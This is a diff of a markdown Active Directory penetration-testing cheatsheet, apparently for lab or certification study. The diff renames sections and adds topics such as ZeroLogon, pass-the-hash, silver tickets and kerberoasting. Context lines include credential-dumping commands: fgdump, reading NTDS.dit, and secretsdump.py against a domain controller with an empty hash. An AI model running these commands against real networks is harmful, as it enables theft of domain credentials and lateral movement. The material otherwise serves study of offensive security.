@@ -1,14 +1,26 @@
 # Active Directory Cheatsheet
 
 ### [AD Enumeration](#AD-Enumeration) 
-* [Enumeration - Manual](###-Enumeration---Manual)
+* Manual Enumeration
+* Automated Enumeration
 
-### [AD Authentication](#AD-Authentication)  
+### [AD Authentication](#AD-Authentication)
+* Dumping NTLM hashes
+* Dumping Kerberos tickets
 
 ### [AD Lateral Movement](#AD-Lateral-Movement) 
+* ZeroLogon Vulnerability
+* Password Spraying
+* Plaintext Credentials
+* Pass-the-Hash
+* Overpass-the-Hash
+* Pass-the-Ticket
+* Silver Tickets
+* Distributed Component Object Model (DCOM)
 
-### [AD Persistence](#AD-Persistence)  
-
+### [Hash Cracking Techniques](#)
+* Cracking NTLM hashes
+* Kerberoasting
 
 ## AD Introduction
 
@@ -142,7 +154,7 @@ Foreach($obj in $Result) {
 
 ## AD Authentication
 
-### NTLM ###
+### Dumping NTLM Hashes
 
 NTLM authentication uses a challenge-response model, where a nonce/challenge encrypted using the user's NTLM hash is validated by the Domain Controller.
 
@@ -166,7 +178,7 @@ cmd> fgdump.exe localhost          # improved pwdump, shutdown firewalls
 cmd> type C:\Windows\NTDS\NTDS.dit # all domain hashes in NTDS.dit file on the Domain Controller
 ```
 
-### Kerberos ####
+### Dumping Kerberos Tickets
 
 Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket (TGT) is issued by the Domain Controller (with the role of Key Distribution Center (KDC)) and is used to request tickets from the Ticket Granting Service (TGS) for access to resources/systems joined to the domain.
 * Hashes are stored in the Local Security Authority Subsystem Service (LSASS).
@@ -230,7 +242,7 @@ $ python secretsdump.py -hashes :[empty_password_hash] '[domain]/[dc_computernam
 $ python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'xor/xor-dc01$@x.x.x.x'
 ```
 
-### Password spraying
+### Password Spraying
 * Dumped plaintext cred or cracked hash for your user?
 * However, no creds/hashes for other users/SPN to use for lateral movement?
 * Does the plaintext cred follow some pattern? e.g. `IAmUser01, IAmUser02 ...`
